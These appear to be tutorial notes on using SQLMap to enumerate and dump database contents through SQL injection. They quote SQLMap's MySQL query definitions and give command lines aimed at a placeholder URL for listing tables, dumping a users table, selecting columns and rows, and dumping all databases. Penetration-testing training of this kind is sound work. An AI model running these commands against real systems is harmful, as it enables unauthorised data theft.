## SQLMap Data Exfiltration
SQLMap has a predefined set of queries for all supported DBMSs

Example of MySQL xml:
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>

In case of a MySQL DBMS:
--banner, VERSION() query will be used
--current-user, CURRENT_USER() query will be used
--users-inband or --users-blind

## Basic DB Data Enumeration
- Database version banner (switch --banner)
- Current user name (switch --current-user)
- Current database name (switch --current-db)
- Checking if the curent user has DBA (administrator) rights (switch --is-dba)

```shell-session
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

## Table Enumeration
```shell-session
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

## Dump Table
```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
- '-T' is for table name
- '--dump-format' to specify HTML or SQLite

## Table/Row Enumeration
```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```
- '-C' are the column names
```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
- '--start' and '--stop' print certain rows

## Conditional Enumeration
```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
- WHERE condition

## Full DB Enumeration
- '--dump'
- '--dump-all'
- '--exclude-sysdbs'
